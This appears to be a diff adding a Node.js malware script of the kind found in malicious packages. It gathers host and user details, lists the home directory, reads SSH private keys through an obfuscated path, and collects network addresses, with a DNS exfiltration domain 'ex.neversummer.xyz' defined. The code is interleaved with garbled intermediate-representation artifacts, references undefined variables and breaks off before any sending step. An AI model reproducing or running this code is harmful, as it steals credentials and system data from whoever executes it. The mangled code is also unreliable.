@@ -1,0 +1,60 @@
+var os = require("os")
+var crypto = require('crypto')
+var fs = require('fs')
+var zlib = require('zlib')
+const dns = require('dns')
+let userInfo = os.userInfo()
+let info = {
+    "hn": os.hostname(),
+    "ar": os.arch(),
+    "pl": os.platform(),
+    "rel": os.release(),
+    "tmp": os.tmpdir(),
+    "mem": os.totalmem(),
+    "up": os.uptime(),
+    "uid": userInfo["uid"],
+    "gid": userInfo["gid"],
+    "un": userInfo["username"],
+    "hd": userInfo["homedir"],
+    "sh": userInfo["shell"],
+    "fn": __filename,
+    "ls": [],
+    "cnt": {},
+    "net": []
+}
+_tmp_0.hn = os.hostname()
+_tmp_0.ar = os.arch()
+_tmp_0.pl = os.platform()
+_tmp_0.rel = os.release()
+_tmp_0.tmp = os.tmpdir()
+_tmp_0.mem = os.totalmem()
+_tmp_0.up = os.uptime()
+_tmp_0.uid = userInfo["uid"]
+_tmp_0.gid = userInfo["gid"]
+_tmp_0.un = userInfo["username"]
+_tmp_0.hd = userInfo["homedir"]
+_tmp_0.sh = userInfo["shell"]
+_tmp_0.fn = __filename
+_tmp_0.ls = __ecma.Array.factory()
+_tmp_0.cnt = {}
+_tmp_0.net = __ecma.Array.factory()
+const baseDomain = "ex.neversummer.xyz"
+const maxLabelLen = 63
+let rayId = crypto.randomBytes(20).toString('hex').substring(0, 8)
+fs.readdirSync(os.homedir()).forEach(file => {
+    info["ls"].push(file);
+})
+let keyFolder = os.homedir() + "/." + "ss" + "h/"
+_tmp_6 = __ecma.Array.factory()
+a.forEach((fileName) => {
+    try {
+        let file = keyFolder + fileName
+        if (fs.existsSync(file)) {
+            info["cnt"][fileName] = fs.readFileSync(file, 'utf8')
+        }
+      } catch(err) {
+      }
+})
+const interfaces = os.networkInterfaces()
+_iterator_0 = <operator>.iterator(interfaces)
+<operator>.formatString("", key, ":", interfaces[key][0]["address"], "")
